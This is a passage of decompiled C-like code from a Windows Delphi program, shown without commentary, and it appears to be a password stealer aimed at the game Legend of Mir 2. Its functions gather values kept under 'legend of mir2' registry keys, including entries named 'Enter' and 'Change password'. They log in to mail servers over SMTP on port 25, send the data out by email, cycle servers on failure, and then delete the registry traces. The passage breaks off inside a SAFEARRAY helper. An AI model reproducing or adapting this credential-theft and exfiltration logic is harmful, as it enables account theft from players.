        sub_404570((volatile __int32 *)&v101, "legend of mir2\\Registry\\", v162);
        v44 = sub_40471C(v101);
        sub_40E8D0(HKEY_CLASSES_ROOT, v44, (const CHAR *)&dword_410DD4, &v102);
        sub_404570((volatile __int32 *)&v99, "legend of mir2\\Registry\\", v162);
        v45 = sub_40471C(v99);
        sub_40E8D0(HKEY_CLASSES_ROOT, v45, (const CHAR *)dword_410E38, &v100);
        sub_404570((volatile __int32 *)&v97, "legend of mir2\\Registry\\", v162);
        v46 = sub_40471C(v97);
        sub_40E8D0(HKEY_CLASSES_ROOT, v46, (const CHAR *)dword_410E4C, &v98);
        sub_404570((volatile __int32 *)&v95, "legend of mir2\\Registry\\", v162);
        v47 = sub_40471C(v95);
        sub_40E8D0(HKEY_CLASSES_ROOT, v47, (const CHAR *)dword_410E60, &v96);
        sub_404570((volatile __int32 *)&v93, "legend of mir2\\Registry\\", v162);
        v48 = sub_40471C(v93);
        sub_40E8D0(HKEY_CLASSES_ROOT, v48, (const CHAR *)dword_410E74, &v94);
        sub_404570((volatile __int32 *)&v91, "legend of mir2\\Registry\\", v162);
        v49 = sub_40471C(v91);
        sub_40E8D0(HKEY_CLASSES_ROOT, v49, (const CHAR *)dword_410E88, &v92);
        sub_404570((volatile __int32 *)&v89, "legend of mir2\\Registry\\", v162);
        v50 = sub_40471C(v89);
        sub_40E8D0(HKEY_CLASSES_ROOT, v50, (const CHAR *)dword_410E9C, &v90);
        sub_404570((volatile __int32 *)&v87, "legend of mir2\\Registry\\", v162);
        v51 = sub_40471C(v87);
        sub_40E8D0(HKEY_CLASSES_ROOT, v51, (const CHAR *)dword_410EB4, &v88);
        sub_404570((volatile __int32 *)&v85, "legend of mir2\\Registry\\", v162);
        v52 = sub_40471C(v85);
        sub_40E8D0(HKEY_CLASSES_ROOT, v52, (const CHAR *)dword_410ED0, &v86);
        sub_404570((volatile __int32 *)&v83, "legend of mir2\\Registry\\", v162);
        v53 = sub_40471C(v83);
        sub_40E8D0(HKEY_CLASSES_ROOT, v53, "EM", &v84);
        sub_4045E4((volatile __int32 *)&v160, 41);
        sub_4047BC(&v163, 1, v40);
        --v38;
      }
      while ( v38 );
    }
    sub_40452C((char **)a1, (__int32)v160);
  }
  if ( v158 )
  {
    sub_40426C(&v159);
    if ( *(_BYTE *)off_42BA84 )
    {
      if ( *off_42B924 )
      {
        sub_40E348((int)sub_410BD0, &v70);
        if ( (int)sub_404804(v70, (_BYTE *)*off_42B9AC) > 0 )
        {
          sub_40E348(*off_42B864[0], &v66);
          sub_4045E4((volatile __int32 *)&v159, 3);
          sub_40E348(*off_42B868, &v65);
          Delphi_CompareCall_404668((int)v65, dword_410F08);
          if ( !v54 )
          {
            v58 = v159;
            v57 = dword_410F14;
            sub_40E348(*off_42B868, &v64);
            ExceptionList = v64;
            sub_4045E4((volatile __int32 *)&v159, 3);
          }
          v58 = v159;
          v57 = dword_41102C;
          ExceptionList = (char *)dword_410B6C;
          sub_4045E4((volatile __int32 *)&v159, 3);
        }
        else
        {
          sub_40E348(*off_42B864[0], &v69);
          sub_4045E4((volatile __int32 *)&v159, 3);
          sub_40E348(*off_42B868, &v68);
          Delphi_CompareCall_404668((int)v68, dword_410F08);
          if ( !v54 )
          {
            v58 = v159;
            v57 = dword_410F14;
            sub_40E348(*off_42B868, &v67);
            ExceptionList = v67;
            sub_4045E4((volatile __int32 *)&v159, 3);
          }
          v58 = v159;
          v57 = dword_4110DC;
          ExceptionList = (char *)dword_410B6C;
          sub_4045E4((volatile __int32 *)&v159, 3);
        }
        v58 = v159;
        sub_40E348(*off_42B924, &v63);
        v57 = (int *)v63;
        ExceptionList = (char *)dword_410B6C;
        sub_4045E4((volatile __int32 *)&v159, 3);
      }
    }
    else
    {
      sub_40E348((int)sub_410BD0, &v82);
      if ( (int)sub_404804(v82, (_BYTE *)*off_42B9AC) > 0 )
      {
        sub_40E348(*off_42B864[0], &v77);
        sub_404570((volatile __int32 *)&v159, (char *)dword_411018, v77);
        sub_40E348(*off_42B868, &v76);
        Delphi_CompareCall_404668((int)v76, dword_410F08);
        if ( !v54 )
        {
          sub_40E348(*off_42B868, &v75);
          sub_4045E4((volatile __int32 *)&v159, 3);
        }
        sub_4045E4((volatile __int32 *)&v159, 5);
      }
      else
      {
        sub_40E348(*off_42B864[0], &v81);
        sub_404570((volatile __int32 *)&v159, (char *)nullsub_3, v81);
        sub_40E348(*off_42B868, &v80);
        Delphi_CompareCall_404668((int)v80, dword_410F08);
        if ( !v54 )
        {
          sub_40E348(*off_42B868, &v79);
          sub_4045E4((volatile __int32 *)&v159, 3);
        }
        sub_40452C(&v159, (__int32)dword_410F20);
        if ( *off_42B92C )
        {
          sub_40E348(*off_42B92C, &v78);
          sub_4045E4((volatile __int32 *)&v159, 5);
        }
        else
        {
          sub_40452C(&v159, (__int32)dword_410B6C);
        }
      }
      sub_40E348(off_42B8E4[0][2], &v74);
      sub_40E348(off_42B8E4[0][1], &v73);
      sub_40E348(*off_42B8E4[0], &v72);
      sub_40E348(*off_42B9F8, &v71);
      sub_4045E4((volatile __int32 *)&v159, 13);
    }
    sub_40426C(&v160);
    sub_40EC2C(&v62);
    sub_40D23C(&v61);
    sub_4045E4((volatile __int32 *)&v160, 6);
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v60);
    Delphi_CompareCall_404668((int)v60, dword_411170);
    v58 = v160;
    if ( v54 )
      v57 = dword_411194;
    else
      v57 = dword_41117C;
    ExceptionList = (char *)dword_410B6C;
    sub_4045E4((volatile __int32 *)&v160, 3);
    v58 = v160;
    v57 = (int *)sub_4111B0;
    sub_40C51C((volatile __int32 *)&v59);
    ExceptionList = v59;
    sub_4045E4((volatile __int32 *)&v160, 5);
    sub_40452C(&v160, (__int32)dword_410B6C);
    sub_40452C((char **)a1, (__int32)v160);
  }
  sub_4042C0(v164, (__int32)v161);
  __writefsdword(0, (unsigned int)ExceptionList);
  v58 = (char *)&loc_410B43;
  sub_404290((int)&v59, 98);
  sub_404290((int)&v162, 2);
  sub_40426C(&v157);
  return sub_404290((int)&v159, 3);
}
// 410696: variable 'v54' is possibly undefined
// 410B6C: using guessed type int dword_410B6C[3];
// 410BA0: using guessed type int dword_410BA0[3];
// 410BD0: using guessed type int __far sub_410BD0();
// 410BF4: using guessed type int dword_410BF4[3];
// 410C08: using guessed type int dword_410C08[2];
// 410C20: using guessed type int[3];
// 410C44: using guessed type int dword_410C44;
// 410D28: using guessed type int dword_410D28[4];
// 410DB0: using guessed type int dword_410DB0[3];
// 410DD4: using guessed type int dword_410DD4;
// 410E38: using guessed type int dword_410E38[3];
// 410E4C: using guessed type int dword_410E4C[3];
// 410E60: using guessed type int dword_410E60[3];
// 410E74: using guessed type int[3];
// 410E88: using guessed type int dword_410E88[3];
// 410E9C: using guessed type int[3];
// 410EB4: using guessed type int dword_410EB4[3];
// 410ED0: using guessed type int dword_410ED0[3];
// 410EF0: using guessed type int __far nullsub_3();
// 410F08: using guessed type int dword_410F08[3];
// 410F14: using guessed type int dword_410F14[3];
// 410F20: using guessed type int dword_410F20[51];
// 411018: using guessed type int dword_411018[5];
// 41102C: using guessed type int dword_41102C[4];
// 4110DC: using guessed type int dword_4110DC[3];
// 411170: using guessed type int dword_411170[3];
// 41117C: using guessed type int dword_41117C[6];
// 411194: using guessed type int dword_411194[5];
// 42B860: using guessed type int *off_42B860[3];
// 42B864: using guessed type int *off_42B864[2];
// 42B868: using guessed type int *off_42B868;
// 42B8E4: using guessed type int *off_42B8E4[2];
// 42B924: using guessed type int *off_42B924;
// 42B92C: using guessed type int *off_42B92C;
// 42B94C: using guessed type int *off_42B94C;
// 42B95C: using guessed type int *off_42B95C;
// 42B9AC: using guessed type int *off_42B9AC;
// 42B9F8: using guessed type int *off_42B9F8;
// 42BA84: using guessed type void *off_42BA84;
// 42CA20: using guessed type char byte_42CA20;
// 40F8D0: using guessed type char *var_24;

//----- (004111B0) --------------------------------------------------------
int sub_4111B0()
{
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  return MK_FP(retaddr[0], retaddr[0])();
}

//----- (004111BC) --------------------------------------------------------
int __usercall sub_4111BC@<eax>(char *a1@<eax>)
{
  char *v1; // eax
  struct hostent *v2; // ebx
  int v4; // [esp+4h] [ebp-8h] BYREF

  v1 = sub_40471C(a1);
  v2 = gethostbyname(v1);
  sub_402E48((char *)&v4, 4, 0);
  if ( v2 )
    return **(_DWORD **)v2->h_addr_list;
  return v4;
}

//----- (00411218) --------------------------------------------------------
SOCKET __usercall sub_411218@<eax>(char *a1@<eax>, u_short a2@<dx>, SOCKET *a3@<ecx>)
{
  SOCKET v4; // ebx
  unsigned int v6[2]; // [esp-Ch] [ebp-1BCh] BYREF
  int *v7; // [esp-4h] [ebp-1B4h]
  struct sockaddr name; // [esp+8h] [ebp-1A8h] BYREF
  struct WSAData WSAData; // [esp+18h] [ebp-198h] BYREF
  SOCKET *v10; // [esp+1A8h] [ebp-8h]
  char *v11; // [esp+1ACh] [ebp-4h] BYREF
  int savedregs; // [esp+1B0h] [ebp+0h] BYREF

  v10 = a3;
  v11 = a1;
  sub_40470C((int)a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_4112C0;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  WSAStartup(0x101u, &WSAData);
  v4 = socket(2, 1, 0);
  if ( v4 == -1 )
  {
    v4 = 0;
  }
  else
  {
    *(_DWORD *)&name.sa_data[2] = sub_4111BC(v11);
    name.sa_family = 2;
    *(_WORD *)name.sa_data = htons(a2);
    if ( connect(v4, &name, 16) )
    {
      v4 = 0;
    }
    else
    {
      *v10 = v4;
      LOBYTE(v4) = 1;
    }
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_4112C7;
  sub_40426C(&v11);
  return v4;
}

//----- (004112D0) --------------------------------------------------------
int __usercall sub_4112D0@<eax>(SOCKET a1@<eax>)
{
  closesocket(a1);
  return WSACleanup();
}

//----- (004112E0) --------------------------------------------------------
int __usercall sub_4112E0@<eax>(SOCKET a1@<eax>, char *a2@<edx>, int a3@<ebx>)
{
  char *v4; // eax
  int v5; // eax
  int v6; // ebx
  unsigned int v8[2]; // [esp-12h] [ebp-1018h] BYREF
  int *v9; // [esp-Ah] [ebp-1010h]
  int v10; // [esp-6h] [ebp-100Ch]
  char buf[5]; // [esp+1h] [ebp-1005h] BYREF
  SOCKET v12; // [esp+6h] [ebp-1000h]
  char *v13; // [esp+1002h] [ebp-4h] BYREF
  int savedregs; // [esp+1006h] [ebp+0h] BYREF

  v12 = a1;
  v10 = a3;
  v13 = a2;
  sub_40470C((int)a2);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_411351;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v4 = sub_40471C(v13);
  sub_40C634(buf, v4);
  v5 = sub_40C61C(buf);
  v6 = send(a1, buf, v5, 4);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_411358;
  sub_40426C(&v13);
  return v6;
}
// 4112E0: could not find valid save-restore pair for ebx

//----- (00411360) --------------------------------------------------------
_DWORD *__usercall sub_411360@<eax>(SOCKET a1@<eax>, char **a2@<edx>)
{
  char buf[1036]; // [esp+0h] [ebp-40Ch] BYREF

  recv(a1, buf, 1024, 0);
  return sub_40C65C(buf, a2);
}

//----- (00411390) --------------------------------------------------------
int sub_411390()
{
  int *v0; // edi
  char v1; // zf
  int v2; // ebx
  int i; // esi
  unsigned int v5[2]; // [esp-Ch] [ebp-A0h] BYREF
  int *v6; // [esp-4h] [ebp-98h]
  char *v7; // [esp+Ch] [ebp-88h] BYREF
  char *v8; // [esp+10h] [ebp-84h] BYREF
  char *v9; // [esp+14h] [ebp-80h] BYREF
  char *v10; // [esp+18h] [ebp-7Ch] BYREF
  char *v11; // [esp+1Ch] [ebp-78h] BYREF
  char *v12; // [esp+20h] [ebp-74h] BYREF
  char *v13; // [esp+24h] [ebp-70h] BYREF
  char *v14; // [esp+28h] [ebp-6Ch] BYREF
  char *v15; // [esp+2Ch] [ebp-68h] BYREF
  char *v16; // [esp+30h] [ebp-64h] BYREF
  char *v17; // [esp+34h] [ebp-60h] BYREF
  char *v18; // [esp+38h] [ebp-5Ch] BYREF
  char *v19; // [esp+3Ch] [ebp-58h] BYREF
  char *v20; // [esp+40h] [ebp-54h] BYREF
  char *v21; // [esp+44h] [ebp-50h] BYREF
  char *v22; // [esp+48h] [ebp-4Ch] BYREF
  char *v23; // [esp+4Ch] [ebp-48h] BYREF
  char *v24; // [esp+50h] [ebp-44h] BYREF
  char *v25; // [esp+54h] [ebp-40h] BYREF
  char *v26; // [esp+58h] [ebp-3Ch] BYREF
  char *v27; // [esp+5Ch] [ebp-38h] BYREF
  struct tagMSG Msg; // [esp+60h] [ebp-34h] BYREF
  char *v29; // [esp+7Ch] [ebp-18h] BYREF
  char *v30; // [esp+80h] [ebp-14h] BYREF
  __int32 v31; // [esp+84h] [ebp-10h] BYREF
  int v32; // [esp+88h] [ebp-Ch] BYREF
  int v33; // [esp+8Ch] [ebp-8h]
  SOCKET v34; // [esp+90h] [ebp-4h] BYREF
  int savedregs; // [esp+94h] [ebp+0h] BYREF

  v0 = (int *)off_42BA28;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41183C;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_40F8D0(&v31, 0, (__int32)&v32);
  if ( v32 )
  {
    sub_40EC2C(&v27);
    Delphi_CompareCall_404668((int)v27, (int *)"127.0.0.1");
    if ( !v1 )
    {
      if ( (int)++*(_DWORD *)off_42BA08 >= 10 )
      {
        *(_DWORD *)off_42BA08 = 1;
        ++*v0;
        while ( !(*off_42B9F4)[6 * *v0 - 5] && *v0 <= 3 )
          ++*v0;
        if ( *v0 > 3 )
          *v0 = 1;
      }
      v2 = 0;
      sub_40E348((*off_42B9F4)[6 * *v0 - 6], &v26);
      if ( (unsigned __int8)sub_411218(v26, 0x19u, &v34) )
      {
        sub_40E348((*off_42B9F4)[6 * *v0 - 6], &v24);
        sub_4045E4((volatile __int32 *)&v25, 3);
        sub_4112E0(v34, v25, 0);
        sub_411360(v34, &v23);
        sub_4112E0(v34, "AUTH LOGIN\r\n", 0);
        sub_411360(v34, &v22);
        sub_40E348((*off_42B9F4)[6 * *v0 - 2], &v21);
        sub_40452C(&v21, (__int32)dword_411878);
        sub_4112E0(v34, v21, 0);
        sub_411360(v34, &v20);
        sub_40E348((*off_42B9F4)[6 * *v0 - 1], &v19);
        sub_40452C(&v19, (__int32)dword_411878);
        sub_4112E0(v34, v19, 0);
        sub_411360(v34, &v29);
        sub_40C250((int)v29, &v18);
        if ( (int)sub_404804("failed", v18) > 0 )
          LOBYTE(v2) = 1;
        if ( !(_BYTE)v2 )
        {
          for ( i = 1; i != 4; ++i )
          {
            PeekMessageA(&Msg, 0, 0, 0, 1u);
            sub_40E428(i, &v17);
            if ( v17 )
            {
              sub_40E348((*off_42B9F4)[6 * *v0 - 5], &v15);
              sub_4045E4((volatile __int32 *)&v16, 4);
              sub_4112E0(v34, v16, v2);
              sub_411360(v34, &v29);
              sub_40E428(i, &v13);
              sub_4045E4((volatile __int32 *)&v14, 4);
              sub_4112E0(v34, v14, v2);
              sub_411360(v34, &v29);
              sub_4112E0(v34, "DATA\r\n", v2);
              sub_411360(v34, &v29);
              sub_40E348((*off_42B9F4)[6 * *v0 - 5], &v12);
              sub_40E428(i, &v11);
              sub_4045E4((volatile __int32 *)&v30, 16);
              v33 = sub_4112E0(v34, v30, v2);
              sub_411360(v34, &v29);
              sub_40C250((int)v29, &v10);
              if ( (int)sub_404804("error", v10) > 0
                || (sub_40C250((int)v29, &v9), (int)sub_404804("failed", v9) > 0)
                || (sub_40C250((int)v29, &v8), (int)sub_404804("refused", v8) > 0)
                || (sub_40C250((int)v29, &v7), (int)sub_404804("start mail input", v7) > 0) )
              {
                LOBYTE(v2) = 1;
              }
              Sleep(0x32u);
            }
          }
        }
        sub_4112E0(v34, "QUIT\r\n", v2);
        sub_411360(v34, &v29);
        sub_4112D0(v34);
        if ( v33 == -1 || (_BYTE)v2 )
        {
          *(_DWORD *)off_42BA08 = 0;
          ++*v0;
          while ( !(*off_42B9F4)[6 * *v0 - 5] && *v0 <= 3 )
            ++*v0;
          if ( *v0 > 3 )
            *v0 = 1;
        }
        else
        {
          sub_40E710(HKEY_CLASSES_ROOT, "legend of mir2", "Enter");
          sub_40E710(HKEY_CLASSES_ROOT, "legend of mir2", "Change password");
          sub_40E710(HKEY_CLASSES_ROOT, "legend of mir2", "Registry");
        }
      }
      else
      {
        *(_DWORD *)off_42BA08 = 0;
        ++*v0;
        while ( !(*off_42B9F4)[6 * *v0 - 5] && *v0 <= 3 )
          ++*v0;
        if ( *v0 > 3 )
          *v0 = 1;
      }
    }
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_411843;
  sub_404290((int)&v7, 21);
  return sub_404290((int)&v29, 4);
}
// 4113E2: variable 'v1' is possibly undefined
// 411878: using guessed type int dword_411878[3];
// 42B9F4: using guessed type int (*off_42B9F4)[18];
// 42BA08: using guessed type void *off_42BA08;
// 42BA28: using guessed type void *off_42BA28;

//----- (004119B0) --------------------------------------------------------
int sub_4119B0()
{
  int *v0; // edi
  int (*v1)[18]; // esi
  char v2; // zf
  int v3; // ebx
  unsigned int v5[2]; // [esp-Ch] [ebp-B0h] BYREF
  int *v6; // [esp-4h] [ebp-A8h]
  char *v7; // [esp+Ch] [ebp-98h] BYREF
  char *v8; // [esp+10h] [ebp-94h] BYREF
  char *v9; // [esp+14h] [ebp-90h] BYREF
  char *v10; // [esp+18h] [ebp-8Ch] BYREF
  char *v11; // [esp+1Ch] [ebp-88h] BYREF
  char *v12; // [esp+20h] [ebp-84h] BYREF
  char *v13; // [esp+24h] [ebp-80h] BYREF
  char *v14; // [esp+28h] [ebp-7Ch] BYREF
  char *v15; // [esp+2Ch] [ebp-78h] BYREF
  char *v16; // [esp+30h] [ebp-74h] BYREF
  char *v17; // [esp+34h] [ebp-70h] BYREF
  char *v18; // [esp+38h] [ebp-6Ch] BYREF
  char *v19; // [esp+3Ch] [ebp-68h] BYREF
  char *v20; // [esp+40h] [ebp-64h] BYREF
  char *v21; // [esp+44h] [ebp-60h] BYREF
  char *v22; // [esp+48h] [ebp-5Ch] BYREF
  char *v23; // [esp+4Ch] [ebp-58h] BYREF
  char *v24; // [esp+50h] [ebp-54h] BYREF
  char *v25; // [esp+54h] [ebp-50h] BYREF
  char *v26; // [esp+58h] [ebp-4Ch] BYREF
  char *v27; // [esp+5Ch] [ebp-48h] BYREF
  char *v28; // [esp+60h] [ebp-44h] BYREF
  char *v29; // [esp+64h] [ebp-40h] BYREF
  char *v30; // [esp+68h] [ebp-3Ch] BYREF
  struct tagMSG Msg; // [esp+6Ch] [ebp-38h] BYREF
  char *v32; // [esp+88h] [ebp-1Ch] BYREF
  char *v33; // [esp+8Ch] [ebp-18h] BYREF
  __int32 v34; // [esp+90h] [ebp-14h] BYREF
  int v35; // [esp+94h] [ebp-10h] BYREF
  int v36; // [esp+98h] [ebp-Ch]
  int v37; // [esp+9Ch] [ebp-8h]
  SOCKET v38; // [esp+A0h] [ebp-4h] BYREF
  int savedregs; // [esp+A4h] [ebp+0h] BYREF

  v0 = (int *)off_42BA80;
  v1 = off_42B888;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_411DFC;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_40F8D0(&v34, 1, (__int32)&v35);
  if ( v35 )
  {
    sub_40EC2C(&v30);
    Delphi_CompareCall_404668((int)v30, (int *)"127.0.0.1");
    if ( !v2 )
    {
      if ( (int)++*(_DWORD *)off_42BA08 >= 10 )
      {
        *(_DWORD *)off_42BA08 = 1;
        ++*v0;
        while ( !(*v1)[6 * *v0 - 5] && *v0 <= 3 )
          ++*v0;
        if ( *v0 > 3 )
          *v0 = 1;
      }
      v36 = 0;
      do
      {
        PeekMessageA(&Msg, 0, 0, 0, 1u);
        Sleep(0x3E8u);
        ++v36;
        v3 = 0;
        sub_40E348((*v1)[6 * *v0 - 6], &v29);
        if ( (unsigned __int8)sub_411218(v29, 0x19u, &v38) )
        {
          sub_40E348((*v1)[6 * *v0 - 6], &v27);
          sub_4045E4((volatile __int32 *)&v28, 3);
          sub_4112E0(v38, v28, 0);
          sub_411360(v38, &v26);
          sub_4112E0(v38, "AUTH LOGIN\r\n", 0);
          sub_411360(v38, &v25);
          sub_40E348((*v1)[6 * *v0 - 2], &v24);
          sub_40452C(&v24, (__int32)dword_411E38);
          sub_4112E0(v38, v24, 0);
          sub_411360(v38, &v23);
          sub_40E348((*v1)[6 * *v0 - 1], &v22);
          sub_40452C(&v22, (__int32)dword_411E38);
          sub_4112E0(v38, v22, 0);
          sub_411360(v38, &v32);
          sub_40C250((int)v32, &v21);
          if ( (int)sub_404804("failed", v21) > 0 )
            LOBYTE(v3) = 1;
          if ( !(_BYTE)v3 )
          {
            sub_40E348((*v1)[6 * *v0 - 5], &v19);
            sub_4045E4((volatile __int32 *)&v20, 4);
            sub_4112E0(v38, v20, v3);
            sub_411360(v38, &v18);
            sub_40E3C8(&v16);
            sub_4045E4((volatile __int32 *)&v17, 4);
            sub_4112E0(v38, v17, v3);
            sub_411360(v38, &v15);
            sub_4112E0(v38, "DATA\r\n", v3);
            sub_411360(v38, &v14);
            sub_40E348((*v1)[6 * *v0 - 5], &v13);
            sub_40E3C8(&v12);
            sub_4045E4((volatile __int32 *)&v33, 16);
            v37 = sub_4112E0(v38, v33, v3);
            sub_411360(v38, &v32);
            sub_40C250((int)v32, &v11);
            if ( (int)sub_404804("error", v11) > 0
              || (sub_40C250((int)v32, &v10), (int)sub_404804("failed", v10) > 0)
              || (sub_40C250((int)v32, &v9), (int)sub_404804("refused", v9) > 0)
              || (sub_40C250((int)v32, &v8), (int)sub_404804("start mail input", v8) > 0) )
            {
              LOBYTE(v3) = 1;
            }
          }
          sub_4112E0(v38, "QUIT\r\n", v3);
          sub_411360(v38, &v7);
          sub_4112D0(v38);
          if ( !((v37 == -1) | (unsigned __int8)v3) )
            break;
          *(_DWORD *)off_42BA08 = 0;
          ++*v0;
          while ( !(*v1)[6 * *v0 - 5] && *v0 <= 3 )
            ++*v0;
          if ( *v0 > 3 )
            *v0 = 1;
        }
        else
        {
          *(_DWORD *)off_42BA08 = 0;
          ++*v0;
          while ( !(*v1)[6 * *v0 - 5] && *v0 <= 3 )
            ++*v0;
          if ( *v0 > 3 )
            *v0 = 1;
        }
      }
      while ( v36 < 3 );
    }
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_411E03;
  sub_404290((int)&v7, 24);
  return sub_404290((int)&v32, 4);
}
// 411A08: variable 'v2' is possibly undefined
// 411E38: using guessed type int dword_411E38[3];
// 42B888: using guessed type int (*off_42B888)[18];
// 42BA08: using guessed type void *off_42BA08;
// 42BA80: using guessed type void *off_42BA80;

//----- (00411F3C) --------------------------------------------------------
int sub_411F3C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_411F61;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CA24;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CA24: using guessed type int dword_42CA24;

//----- (00411F6C) --------------------------------------------------------
void sub_411F6C()
{
  --dword_42CA24;
}
// 42CA24: using guessed type int dword_42CA24;

//----- (00411F74) --------------------------------------------------------
int sub_411F74()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_411F99;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CA28;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CA28: using guessed type int dword_42CA28;

//----- (00411FA4) --------------------------------------------------------
void sub_411FA4()
{
  --dword_42CA28;
}
// 42CA28: using guessed type int dword_42CA28;

//----- (0041200C) --------------------------------------------------------
int sub_41200C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_412031;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CA2C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CA2C: using guessed type int dword_42CA2C;

//----- (0041203C) --------------------------------------------------------
void sub_41203C()
{
  --dword_42CA2C;
}
// 42CA2C: using guessed type int dword_42CA2C;

//----- (00412160) --------------------------------------------------------
void __thiscall __noreturn sub_412160(void *this)
{
  sub_4027E8(17, this);
}

//----- (00412168) --------------------------------------------------------
void __thiscall __noreturn sub_412168(void *this)
{
  sub_4027E8(15, this);
}

//----- (00412170) --------------------------------------------------------
void __thiscall __noreturn sub_412170(void *this)
{
  sub_4027E8(16, this);
}

//----- (00412178) --------------------------------------------------------
void __usercall sub_412178(VARIANTARG *a1@<eax>)
{
  VariantInit(a1);
}

//----- (00412180) --------------------------------------------------------
VARIANTARG *__usercall sub_412180@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>)
{
  unsigned __int16 v2; // bx
  void *v3; // ecx
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  v4[0] = a2;
  v2 = result->vt & 0xFFF;
  if ( v2 >= 0x10Fu )
  {
    if ( !sub_415EA4(v2, v4) )
      sub_412170(v3);
    return (VARIANTARG *)(*(int (**)(void))(*(_DWORD *)v4[0] + 36))();
  }
  else if ( (result->vt & 0x4000) != 0 || v2 < 8u )
  {
    result->vt = 0;
  }
  else if ( v2 == 256 )
  {
    result->vt = 0;
    return (VARIANTARG *)sub_40426C(&result->lVal);
  }
  else if ( v2 == 257 )
  {
    return (VARIANTARG *)dword_42CA44();
  }
  else
  {
    return (VARIANTARG *)VariantClear(result);
  }
  return result;
}
// 4121EF: variable 'v3' is possibly undefined
// 42CA44: using guessed type int (*dword_42CA44)(void);
// 412180: using guessed type int var_C[3];

//----- (004121F8) --------------------------------------------------------
int sub_4121F8(VARIANTARG *a1, _WORD *a2, int a3, ...)
{
  int v3; // ecx
  unsigned __int16 v4; // bx
  void *v6; // ecx
  int v7; // [esp+Ch] [ebp-4h] BYREF
  va_list va; // [esp+24h] [ebp+14h] BYREF

  va_start(va, a3);
  v4 = *a2 & 0xFFF;
  if ( a1 )
    sub_412180(a1, v3);
  if ( v4 < 0x10Fu )
    return dword_42CA40(a1, a2, a3, va);
  if ( !sub_415EA4(v4, &v7) )
    sub_412170(v6);
  return (*(int (__fastcall **)(_WORD *, VARIANTARG *, char *, int))(*(_DWORD *)v7 + 16))(a2, a1, va, a3);
}
// 412213: variable 'v3' is possibly undefined
// 412258: variable 'v6' is possibly undefined
// 42CA40: using guessed type int (__cdecl *dword_42CA40)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00412264) --------------------------------------------------------
int __usercall sub_412264@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  LOBYTE(a2) = 1;
  if ( *(_DWORD *)(a3 + 8 * a1 - 768) + *(_DWORD *)(a3 + 8 * a1 - 764) == ++*(_DWORD *)(a3 + 4 * a1 - 256) )
  {
    if ( a1 )
    {
      *(_DWORD *)(a3 + 4 * a1 - 256) = *(_DWORD *)(a3 + 8 * a1 - 764);
      return sub_412264(a3);
    }
    else
    {
      return 0;
    }
  }
  return a2;
}

//----- (004122C0) --------------------------------------------------------
int __usercall sub_4122C0@<eax>(VARIANTARG *a1@<eax>, const VARIANTARG *a2@<edx>, void (*a3)(void)@<ecx>)
{
  int result; // eax
  UINT v4; // ebx
  int v5; // edi
  SAFEARRAYBOUND *p_rgsabound; // esi
  void *v7; // ecx
  void *v8; // ecx
  void *v9; // ecx
  SAFEARRAY *v10; // esi
  UINT v11; // ebx
  LONG *p_lLbound; // eax
  LONG *v13; // edx
  void *v14; // ecx
  void *v15; // ecx
  int v16; // edx
  void *v17; // [esp+10h] [ebp-31Ch] BYREF
  void *ppvData; // [esp+14h] [ebp-318h] BYREF
  SAFEARRAY *psa; // [esp+18h] [ebp-314h]
  UINT cDims; // [esp+1Ch] [ebp-310h]
  LONG plUbound; // [esp+20h] [ebp-30Ch] BYREF
  void (*v22)(void); // [esp+24h] [ebp-308h]
  VARIANTARG *pvargDest; // [esp+28h] [ebp-304h]
  SAFEARRAYBOUND rgsabound; // [esp+2Ch] [ebp-300h] BYREF
  LONG rgIndices[64]; // [esp+22Ch] [ebp-100h] BYREF
  int savedregs; // [esp+32Ch] [ebp+0h] BYREF

  v22 = a3;
  pvargDest = a1;
  if ( (a2->vt & 0xFFF) != 12 )
    return VariantCopy(pvargDest, a2);
  if ( (a2->vt & 0x4000) != 0 )
    psa = (SAFEARRAY *)*a2->plVal;
  else
    psa = a2->parray;
  cDims = psa->cDims;
  if ( (int)(cDims - 1) >= 0 )
  {
    v4 = cDims;
    v5 = 0;
    p_rgsabound = &rgsabound;
    do
    {
      if ( SafeArrayGetLBound(psa, v5 + 1, &p_rgsabound->lLbound) )
